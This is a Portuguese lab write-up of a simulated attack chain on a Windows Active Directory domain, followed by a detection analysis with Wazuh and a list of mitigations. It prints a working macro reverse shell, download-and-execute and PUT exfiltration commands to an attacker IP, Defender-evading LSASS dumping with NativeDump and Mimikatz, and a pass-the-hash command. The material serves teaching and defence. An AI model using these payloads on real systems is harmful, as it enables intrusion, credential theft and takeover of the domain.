### **Em construção...... Analise pos ataque em construção**


# Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
<br>
<br>

## Objetivo

Esta parte do projeto é a continuação do projeto anterior [Windows Server AD](https://github.com/MercioRodrigues/Windows-server-AD/blob/main/README.md), no qual foi construído, em laboratório, um ambiente Active Directory. Foram também utilizadas ferramentas que já tinham sido preparadas em outro projeto que realizei anteriormente, o [SOC SOAR Project](https://github.com/MercioRodrigues/SOC-SOAR-Project), nomeadamente o **Wazuh**.  
<br>  
Esta fase tem como objetivo simular uma cadeia de ataque realista em um ambiente de domínio Windows, sem detecção por parte do Windows Defender, explorando diferentes etapas de comprometimento típicas de atacantes reais. A simulação foi conduzida em um laboratório controlado, permitindo, posteriormente, a análise detalhada de cada fase da intrusão.


A cadeia de ataque envolve as seguintes etapas:

1. [Acesso inicial:](#-fase-1---acesso-inicial-via-macro-em-documento-word-phishing) comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
2. [Escalada de privilégios local:](#-fase-2--escalada-de-privil%C3%A9gios-local) obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
3. [Enumeração do dominio:](#-fase-3--enumera%C3%A7%C3%A3o-p%C3%B3s-escala%C3%A7%C3%A3o) Enumerar o ambiente local e de domínio e avaliar a viabilidade de extrair as credenciais da memória (lsass.exe).
4. [Exfiltração de credenciais e Acesso ao DC:](#fase-4--extra%C3%A7%C3%A3o-de-credenciais-e-acesso-ao-dc) extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM e acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.
 

[Análise pós-ataque:](#Análise-pós-ataque) utilização de ferramentas de monitorização e deteção como **Wazuh** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.

O objetivo final é obter não apenas uma shell no controlador de domínio, mas também documentar detalhadamente os indicadores de comprometimento (IoCs), comportamentos suspeitos e evidências forenses que podem ser usadas por equipes de defesa para deteção precoce e resposta a incidentes.

---

⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*


<br>
<br>

## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)

Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.

###  Objetivo

Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.

---

### Conteúdo da Macro

A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:

- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
- `test()`: define e executa o payload PowerShell em modo oculto

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub
```

<p align="center">
 
  <br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

---

### Listener do Atacante

Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:

```bash
rlwrap nc -lvnp 443
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resumo**

O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:

**1.** Recebe comandos enviados pelo atacante

**2.** Executa os comandos localmente com Invoke-Expression (iex)

**3.** Envia a saída da execução de volta através do canal TCP

Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.

 <br/>
    <br/>

## 🧪 Fase 2 — Escalada de Privilégios Local

Após o acesso inicial, o próximo objetivo foi escalar privilégios para obter controlo total do sistema como **NT AUTHORITY\SYSTEM**.  
Esta fase consistiu na **descoberta e exploração de uma tarefa agendada mal configurada**, permitindo a execução de código com permissões elevadas.

---

### 1. Preparação do Ambiente de Investigação

Foi criado um servidor de upload/download em Python na máquina atacante para facilitar a transferência de ficheiros entre as máquinas:

```bash
python3 upload_server.py
# [+] Serving HTTP upload/download server at port 8080
```

---

### 2. Execução do WinPEAS e Exfiltração do Output

Na shell da vítima, foi executado o `winPEASps1.ps1`, e a saída foi guardada num ficheiro `.txt`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```

Em seguida, o ficheiro foi exfiltrado para a máquina do atacante:

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/d11db3f6-816b-45a4-b7a7-11ef05ae2246" height="60%" width="60%"/>
    <br/>
    <br/>
    <img src="https://github.com/user-attachments/assets/1cd6ede9-e275-484c-9a32-ac27e3fbdcac" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>



---

### 3. Análise do Output do WinPEAS

Na máquina atacante, o output foi segmentado por tarefas agendadas:

```bash
awk '
/^TaskName:/ {
    ++i;
    f = sprintf("task_%03d.txt", i);
}
f { print > f }
' winpeas.txt
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/1dacf129-6f1a-4b05-8fcb-f7febbe8d0bb" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

Depois, filtrou-se por tarefas que correm como `SYSTEM`:

```bash
grep -l "Run As User: *SYSTEM" task_*.txt > SYSTEM_tasks.txt
```

E procuraram-se scripts suspeitos:

```bash
grep -Ei "ps1|bat|cmd|exe" $(cat SYSTEM_tasks.txt) | grep -i "task to run"
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/845d809a-25e0-4a1a-b050-028f2f5db977" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Foi identificado a seguinte tarefa crítica:

```text
task_012.txt:Task To Run: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\TempTask\svc_launcher.ps1
```

Lendo o conteudo de **task_012.txt** conseguimos obter a informação mais completa sobre a tarefa.

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/c523e3eb-39da-4398-b588-4091550ed2bf" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

---

### 4. Verificação de Permissões

Foi verificado que o utilizador comprometido (`jsilva`) tinha permissões de **controlo total** sobre o ficheiro `.ps1` usado pela tarefa:

```powershell
icacls C:\TempTask\svc_launcher.ps1
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/875ef2f9-e9af-465e-b1c8-45014cca5b24" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Saída relevante:

```
PILAO\jsilva:(I)(F)          → Full control — pode sobrescrever este ficheiro
NT AUTHORITY\SYSTEM:(I)(F)   → A tarefa agendada corre o script como SYSTEM
```

---

### 5. Substituição do Script e Execução da Tarefa

Foi feito o upload de um **script malicioso** com reverse shell, substituindo o original:

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.205:8080/svc_launcher.ps1' -OutFile 'C:\TempTask\svc_launcher.ps1'"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/4d36fb25-f3e4-47c3-b7c3-4efe2c2cf370" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a vitima inicie a máquina mas, como tratasse de um laboratório forcei o reinício:

```powershell
Restart-Computer -Force
```

---

### 6. Resultado — Shell como SYSTEM

Na máquina atacante, aguardou-se ligação à porta 4444:

```bash
rlwrap nc -lvnp 4444
```

Após o reinício da vítima:

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/448ad18a-e3b8-4bee-b28b-f0d69decd94f" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>




A escalada foi bem-sucedida! O atacante obteve **acesso completo com privilégios SYSTEM**.

---

### Resumo

A má configuração de permissões num script chamado por uma tarefa agendada como SYSTEM foi explorada com sucesso para **escalar privilégios localmente**.

A utilização do `winPEAS` permitiu descobrir a vulnerabilidade, a análise de permissões confirmou a possibilidade de exploração, e a substituição do script permitiu ganhar **controlo total do sistema**, com acesso **persistente**.

<br/>
<br/>

## 🧪 Fase 3 – Enumeração Pós-Escalação

Após escalar privilégios locais até `NT AUTHORITY\SYSTEM`, o objetivo passou a ser:

- **Enumerar o ambiente local e de domínio**  
- **Avaliar a viabilidade de extrair credenciais da memória (`lsass.exe`)**

---

### 1. Verificar se a máquina está num domínio

```powershell
systeminfo | findstr /B /C:"Domain"
```

**Resultado:**

```
Domain: pilao.pt
```

✅ Isto confirma que a máquina está unida ao domínio `pilao.pt`. Esse facto é importante porque credenciais de **utilizadores do domínio** podem estar armazenadas em memória, especialmente se fizeram login interativo recentemente.

---

### 2. Obter o hostname da máquina comprometida

```powershell
hostname
```

**Resultado:**

```
Client1
```

Esta informação ajuda a identificar o endpoint dentro da infraestrutura.

---

### 3. Listar utilizadores locais e de domínio

```powershell
wmic useraccount get name,sid
```

🔍 Procura por utilizadores olhando para o `RID`:

- `500` → Administrator  
- `502` → krbtgt (conta usada pelo Kerberos)  
- `1000+` → contas personalizadas  

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b1e32638-eeb0-4172-b39f-899b302a4ac4" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

```powershell
net group "Domain Admins" /domain
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/4a37c0e3-06c1-47da-bbc6-865846bea87b" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
Group name     Domain Admins
Members:
  Administrator
```

✅ A presença do utilizador `Administrator` no grupo `Domain Admins` confirma que este tem **controle total** sobre o domínio.

---

### 4. Ver permissões

```powershell
whoami /all
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/023e075c-27b1-4029-a32c-29dceddff2b9" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultados importantes:**

User: NT AUTHORITY\SYSTEM

Groups:
- BUILTIN\Administrators
- NT AUTHORITY\SERVICE
- NT AUTHORITY\Authenticated Users
- NT AUTHORITY\This Organization
- LOCAL
- NT SERVICE\Schedule

Previlégios:
**SeDebugPrivilege:** ✅ Enabled

✅ Isto confirma:
- Estamos como NT **AUTHORITY\SYSTEM**
- Com **privilégios máximos no domínio**
- E com o privilégio **SeDebugPrivilege**, necessário para ler a memória de lsass.exe




🚨 O privilégio `SeDebugPrivilege` permite ler a memória de processos de outros utilizadores, inclusive do `lsass.exe`.

---

### 5. Enumerar os Controladores de Domínio (Domain Controllers)

```powershell
nltest /dclist:pilao.pt
```

**Resultado:**

```
Marcio.pilao.pt [PDC]
```
<br/>
<br/>

**Comando**

```powershell
nslookup -type=SRV _ldap._tcp.dc._msdcs.pilao.pt
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/fa036c25-c1b6-4673-98c9-df17860bed9d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
_ldap._tcp.dc._msdcs.pilao.pt   SRV service location:
    svr hostname = marcio.pilao.pt
    svr hostname = server2.pilao.pt

marcio.pilao.pt -> 192.168.1.200  
server2.pilao.pt -> 192.168.1.201
```

✅ Identificar os Domain Controllers é essencial para **movimento lateral**.

---

### 6. Verificar partilhas administrativas no domínio

```powershell
net view \\pilao.pt
```

**Resultado:**

```
NETLOGON    Disk    Logon server share
SYSVOL      Disk    Logon server share
```

**Estes são diretórios críticos do AD, usados para scripts de login e políticas de grupo (GPOs).** 

---

### 7. Testar acesso ao C$ (Admin Share) no DC

```powershell
Start-Process cmd -ArgumentList '/c net use \\pilao.pt\C$' -WindowStyle Hidden
```

```powershell
Get-SmbConnection | Select-Object -Property ShareName, ServerName, UserName
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/d0b0f854-9e95-483a-97ec-383e0e512ea7" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resultado:**

```
ShareName ServerName       UserName
--------- -----------      --------
IPC$      Marcio.pilao.pt  PILAO\CLIENT1$
C$        pilao.pt         PILAO\Administrator
```

✅ Isto confirma que a shell atual tem acesso **total** ao sistema de ficheiros do DC via `C$` — partilha administrativa para administradores.

---

### Implicações para o Atacante

Com estes dados confirmados:

- ✅ Shell com privilégios de **Domain Admin**  
- ✅ Acesso SMB autenticado ao Domain Controller  
- ✅ Capacidade para:   
  - Exfiltrar credenciais  
  - Iniciar **movimento lateral** (pivoting) ou **persistência em domínio**

---

### Conclusão da Fase 3

Com privilégios de `NT AUTHORITY\SYSTEM` e verificação de que estamos como **Domain Admin**, foi possível confirmar que o sistema comprometido é uma excelente base para:

- Extração de credenciais da memória (`lsass.exe`).
- Acesso irrestrito ao domínio.  

---

<br/>
    <br/>

## 🧪Fase 4 — Extração de Credenciais e Acesso ao DC

Após a obtenção de privilégios SYSTEM, o objetivo passou a ser capturar credenciais da memória do processo `lsass.exe`, de forma furtiva e sem acionar o Defender. Essas credenciais permitiram depois acesso ao Controlador de Domínio.

---

### 1. Compilar o NativeDump no Kali Linux

A ferramenta utilizada foi o **NativeDump** (versão em Golang), que depois de sofrer cross-compilation não foi detetável por soluções como o Windows Defender.

```bash
wget https://raw.githubusercontent.com/ricardojoserf/NativeDump/main/golang-flavour/nativedump.go
```

Inicialização do projeto Go:

```bash
go mod init nativedump
go mod tidy
```

Compilação para Windows (cross-compilation):

```bash
env GOOS=windows GOARCH=amd64 go build nativedump.go
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/a252cd72-e443-4422-a4e3-d41527263962" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>



✅ Gera o ficheiro `nativedump.exe`, pronto para transferência.

---

### 2. Transferência do Executável para a Vítima

```powershell
Invoke-WebRequest -Uri "http://192.168.1.205:8080/nativedump.exe" -OutFile "C:\Windows\Temp\nativedump.exe"
cd C:\Windows\Temp
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/bccb6186-b9d4-468a-b900-b3eb673126bf" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

Transferência feita sem levantar alertas.

---

### 3. Dump de LSASS

```powershell
.\nativedump.exe -o .\proc_664.dmp
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/3125424b-68fa-4579-a267-79478a053e1e" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

✅ O NativeDump identificou automaticamente o PID do processo `lsass.exe` e gerou um dump da sua memória sem alertar o Windows Defender. Este dump incluiu credenciais e hashes em uso no momento.

---

### 4. Exfiltrar o Dump para o Atacante

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method PUT -InFile "C:\Windows\Temp\proc_696.dmp"
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/69713f1e-ff9c-4051-9ad8-6ca858fcae0f" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

✅ O dump foi transferido com sucesso para análise offline no Kali.

---

### 5. Análise com Mimikatz

A análise do ficheiro `.dmp` foi feita offline no Kali com **Mimikatz**, via `wine`:

```bash
wine mimikatz.exe
```

Comandos utilizados:

```mimikatz
sekurlsa::minidump /home/kali/Downloads/uploadserver/proc_696.dmp
sekurlsa::logonPasswords
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/30aa347b-b5bb-4763-a773-a5f013692b45" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/760f2bf8-63d6-42ba-9143-596a1c739a0d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Output relevante:**

```
Username : Administrator 500
NTLM     : a1f074c272b7d460ccdd7f8f19c5419b
Já sabemos que pertence ao domínio PILAO e o DC tem IP:192.168.1.200 
```

✅ Obtido o hash NTLM do utilizador `Administrator` (confirmado como membro do grupo `Domain Admins`).

---

### 6. Acesso Remoto com Pass-The-Hash

Com as informações necessárias e o hash NTLM em posse, foi possível autenticar no **Controlador de Domínio** remotamente:

```bash
python3 ~/impacket/examples/wmiexec.py PILAO/Administrator@192.168.1.200 -hashes :a1f074c272b7d460ccdd7f8f19c5419b
```


<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b990afa8-37c4-4eca-9e0f-9f8b189664e5" height="100%" width="100%"/>
    <br/>
    <br/>
  <p/>

Shell remota estabelecida:

```cmd
C:\> whoami
pilao\administrator
```

---

### ✅ Resultado

O atacante agora detém controlo completo sobre o domínio:

- Acesso ao **DC (Domain Controller)**
- Permissões de **Administrador de Domínio**
- Capacidade de:
  - Extrair hashes de toda a base de utilizadores
  - Modificar políticas de grupo (GPOs)
  - Criar utilizadores e persistência
  - Efetuar **movimentações laterais**
  - Lançar ataques como Golden Ticket ou DCSync

---

<br/><br/>
<br/><br/>

# Análise pós-Ataque

<br/>
<br/>

##  Fase 1 — Deteção de Acesso Inicial via Macro Maliciosa (Phishing)
<br/>
<br/>

###  Objetivo da Monitorização
<br/>

Detectar tentativas de execução remota sem ficheiros (fileless), explorando macros em documentos do Office e invocação de comandos PowerShell com técnicas de evasão.

<br/>
<br/>

###  Detalhes da Deteção com Wazuh

Durante esta fase, o agente Wazuh configurado na máquina da vítima reportou diversos eventos críticos que ajudam a reconstruir o vetor de intrusão.
<br/>
<br/>
![Screenshot 2025-06-22 002321](https://github.com/user-attachments/assets/04d864fb-a471-46c2-b14f-3e421998afe9)
<br/>
<br/>
*Resumo cronológico dos alertas gerados nesta fase, fornecendo contexto de execução e correlação entre regras.*

---
<br/>
<br/>

###  1. Criação de ficheiro `.LNK` via WINWORD.EXE


<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b19d84b0-be06-44eb-9600-c98fd7207921" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


> Este alerta mostra que a aplicação Microsoft Word (`WINWORD.EXE`) criou um ficheiro `.LNK` suspeito em `AppData\Roaming\Microsoft\Office\Recent`.

**Detalhes relevantes:**
- **Técnica detetada**: `T1187` — *Forced Authentication*
- **Ficheiro gerado**: `test.LNK`
- **Canal**: `Microsoft-Windows-Sysmon/Operational`
- **User**: `PILAO\\jsilva`

> ⚠️ Este tipo de evento é frequentemente associado a métodos iniciais de persistência ou spear phishing, onde o `.LNK` serve de ponte para execução remota ou carga maliciosa adicional.

---
<br/>
<br/>

###  2. Execução de Script PowerShell com TcpClient

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/cf846f9c-3b4d-4198-b14f-6ef0ee7eabda" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


> Foi registada a criação de um script PowerShell que estabelece uma ligação TCP à máquina de controlo (`192.168.1.205:443`).

**Comportamento detetado:**
- **Canal**: `Microsoft-Windows-PowerShell/Operational`
- **Técnica usada**: `TcpClient` (System.Net.Sockets)
- **Severidade**: `WARNING`
- **Indicadores de Evasão**:
  - `-NoProfile`
  - `-ExecutionPolicy Bypass`
  - `-WindowStyle Hidden`
- **Evento ID**: `4104` — Execução de blocos de script PowerShell

> ⚠️ Estes padrões são comuns em **reverse shells** fileless, onde o código malicioso não reside no disco, dificultando deteção baseada em assinaturas.

---

<br/>
<br/>

###  3. Ligação de Rede por PowerShell

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/f9f16950-3598-4981-8742-58f1d1c51148" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> Foi detetada uma ligação de rede iniciada por PowerShell para o endereço `192.168.1.205`, porta `443`.

**Pontos chave do alerta:**
- **Regra Wazuh**: `technique_id=T1059.001` (PowerShell Execution)
- **Processo ativo**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
- **Origem do utilizador**: `PILAO\\jsilva`
- **Canal de deteção**: Sysmon

> ⚠️ Comunicação na porta 443 com comportamento PowerShell é altamente suspeita de canal C2 (Command and Control).

---

<br/>
<br/>

###  4. Execução de whoami.exe em contexto malicioso

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/0b8cb22d-4066-4b3e-915c-94980031f3a8" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>



> O sistema detetou a execução de `whoami.exe` iniciada a partir de `powershell.exe`, com o parent command sendo o script malicioso executado que originou a reverse shell. Corroborando a ideia que o comando whoami foi executado na reverse shell.

**Cadeia de processo:**
- **Parent**: `powershell.exe` com `TcpClient`
- **Child**: `C:\Windows\SysWOW64\whoami.exe`
- **Propósito**: confirmação de permissões no sistema

> ⚠️ É comum em ataques pós-exploração para validar se o acesso obtido tem privilégios adequados para continuar o ataque.

---
<br/><br/>

### ✅ Conclusão da Fase 1
<br/><br/>
A Wazuh demonstrou capacidades eficazes na deteção de comportamentos **fileless**, utilizando análise de processo, criação de ficheiros, execução de comandos PowerShell, e atividades de rede.

**Resumo dos indicadores detetados:**
- Execução remota via `WINWORD.EXE`
- `.LNK` drop suspeito
- Script PowerShell com ligações TCP e bypass de políticas
- whoami executado sob contexto malicioso

🔐 **Recomendações:**
- Usar políticas de grupo (GPO) para bloquear completamente macros em ficheiros provenientes da internet.
- Configurar o Office para apenas permitir macros assinadas digitalmente por entidades confiáveis.
- Criar regras para bloquear execução de PowerShell em contextos não administrativos.
- Bloquear escrita de .lnk em diretórios sensíveis por parte de aplicações como WINWORD.EXE
- Usar AMSI (Antimalware Scan Interface) para bloquear scripts ofuscados ou suspeitos em tempo real.
- Usar EDR para bloquear execuções suspeitas com base em heurística e MITRE ATT&CK TTPs.
- Usar alerta de correlação para deteção multi-evento (chain-based).
- Realizar campanhas regulares de simulação de phishing e Treinar colaboradores para não ativar conteúdo (ex: macros) de fontes desconhecidas

---

<br/><br/>
#### Resultado

A fase de acesso inicial foi plenamente detetada pelo Wazuh com base em:
- Relacionamento de processos (Office → PowerShell)
- Comportamento de rede anómalo
- Comando PowerShell suspeito
- Execução fileless in-memory

Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte de um SOC ou EDR automatizado.

---
<br/>
<br/>

#  Fase 2 — Escalada de Privilégios

<br/>
<br/>

##  Alertas Gerados

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/e5280d6f-2b8c-4c14-abc5-c4fc6d2e3ce4" height="80%" width="80%"/>
 <br/>
   <br/>
 <img src="https://github.com/user-attachments/assets/1e52597f-becb-4683-aba3-110be8ba0ec9" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> Durante esta fase, é evidente o início da pós-exploração, com o objetivo de obter controlo privilegiado sobre o sistema. As imagens mostram uma sequência coordenada de alertas relacionados com execução de código, comunicações de rede, movimentação lateral e potenciais alterações ao sistema para persistência.

<br/>
<br/>

###  Padrões identificados:
- Utilização de **PowerShell para executar comandos remotamente**.
- **Exfiltração de dados** usando `Invoke-RestMethod`.
- Comunicação com um servidor de controlo na porta **8080**, usada para upload e download de scripts e resultados.
- Execução de binários do sistema (`icacls.exe`, `schtasks.exe`) a partir de localizações suspeitas.
- Alertas sobre **possível execução de código via strings**, download cradles e criação ou alteração de scripts `.ps1`.

<br/>
<br/>

> ⚠️ Estes eventos indicam claramente uma **fase de escalada de privilégios local**, na qual o atacante procura aumentar o seu nível de acesso, manter persistência e preparar fases subsequentes de exploração.

---

<br/>
<br/>

##  1. Transferência de Script PowerShell via HTTP (winPEAS)

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/7f11b134-5041-4fb8-ad49-064e94ae245e" height="80%" width="80%"/>
 <br/>
   <br/>
 <img src="https://github.com/user-attachments/assets/59382103-474c-4647-a342-669e9b19e7d0" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> ⚠️ Foi detetada uma ligação de rede iniciada pelo processo `powershell.exe` para o endereço **192.168.1.205** na porta **8080**, seguida da execução de um comando para descarregar e executar um script e o seu output armazenado num ficheiro.

---

<br/>
<br/>

### Detalhes do Comportamento

- **Processo responsável**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
- **Comando executado**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```
- **Origem da ligação**: `192.168.1.206`
- **Destino da ligação**: `192.168.1.205:8080`
- **Canal de eventos**: `Microsoft-Windows-PowerShell/Operational`
- **Tipo de evento**:
  - `4104` — Execução de ScriptBlock
  - `3` — Conexão de rede via PowerShell
<br/>
<br/>

### 🔍 Interpretação Defensiva

Este conjunto de eventos mostra um **comportamento clássico de pós-exploração**, onde o atacante utiliza o PowerShell para descarregar ferramentas auxiliares como o **winPEAS**, com o intuito de **enumerar o sistema local** e identificar potenciais vetores de escalada de privilégios, neste caso para escapar ao Windows defender foi descarregado um script para enumeração simples sendo assim evasiva.

O uso da função `IEX` (Invoke-Expression), aliado ao `DownloadString`, constitui um **método típico de execução fileless**. O ficheiro é descarregado diretamente para a memória e armazenado localmente.

---

<br/>
<br/>

##  2. Exfiltração de Dados via `Invoke-RestMethod`

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/24a355a3-bcbc-41f6-b55e-17b159e18763" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

>  ⚠️ Este alerta registado pela Wazuh demonstra claramente a **exfiltração do ficheiro** para um servidor remoto, usando o comando `Invoke-RestMethod` com o método HTTP `PUT`.

---

<br/>
<br/>

### Detalhes técnicos do alerta:

- **Comando invocado**:
  ```powershell
  Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
  ```
- **Canal**: Microsoft-Windows-PowerShell/Operational  
- **Ficheiro exfiltrado**: `winpeas.txt`, gerado anteriormente com os resultados da enumeração feita via WinPEAS  
- **Destino remoto**: `192.168.1.205` na porta `8080` (servidor de receção configurado pelo atacante)
- **Processo associado**: `powershell.exe` com PID `8296`  
- **Severidade**: `INFORMATION`, mas com conteúdo altamente sensível

---
<br/>
<br/>

**Contexto adicional:**

O payload revela que a sessão PowerShell foi iniciada com parâmetros evasivos:
- `-NoProfile`
- `-ExecutionPolicy Bypass`

A exfiltração é realizada após a execução do script de enumeração, e demonstra a tentativa de **subtrair dados críticos do sistema de forma encoberta**, usando um canal HTTP simples e fácil de omitir inspeção profunda de pacotes (DPI).

<br/>
<br/>

##  3. Verificação de Permissões e Substituição Maliciosa de Script Agendado

<br/>
<br/>

O próximo conjunto de alertas revela um comportamento ofensivo associado à **elevação de privilégios através da substituição de ficheiros** usados por tarefas agendadas.

<br/>
<br/>

### 🛠 Alerta 1: Execução de `icacls.exe`

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/c1c44292-71c0-4a4b-83c4-4362eefe1ddf" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

- **Comando Executado**:
  ```cmd
  C:\Windows\system32\icacls.exe C:\TempTask\svc_launcher.ps1
  ```
- **Objetivo**: Enumerar permissões do ficheiro `svc_launcher.ps1` localizado em `C:\TempTask`, usado pelo sistema.
- **Processo Parent**: `powershell.exe` com comando TCPClient típico de backdoor.

<br/>
<br/>

> ⚠️ Este comportamento revela a **intenção de analisar permissões** para determinar se o ficheiro podia ser substituído.

<br/>
<br/>

### 🛠 Alerta 2: `Invoke-WebRequest` com Substituição do Script!

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/9704dda8-e6f2-4005-a17e-b57383e19be3" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


- **Comando PowerShell**:
  ```powershell
  Invoke-WebRequest -Uri "http://192.168.1.205:8080/svc_launcher.ps1" -OutFile "C:\TempTask\svc_launcher.ps1"
  ```
- **Intenção**: Substituir o ficheiro legítimo por uma versão maliciosa descarregada do servidor remoto.

<br/>
<br/>

**⚠️ Contexto de Abuso**:
- O ficheiro `svc_launcher.ps1` encontrava-se **mal protegido**, com permisões elevadas e configurado para ser executado por uma **tarefa automática ao arranque do sistema**.
- Ao substituí-lo, o atacante assegura que o **script malicioso será executado com privilégios SYSTEM** na próxima reinicialização.

---

<br/>
<br/>

**Conclusão:**
Estes eventos representam uma tentativa clara de **elevação de privilégios por substituição de scripts agendados**.  
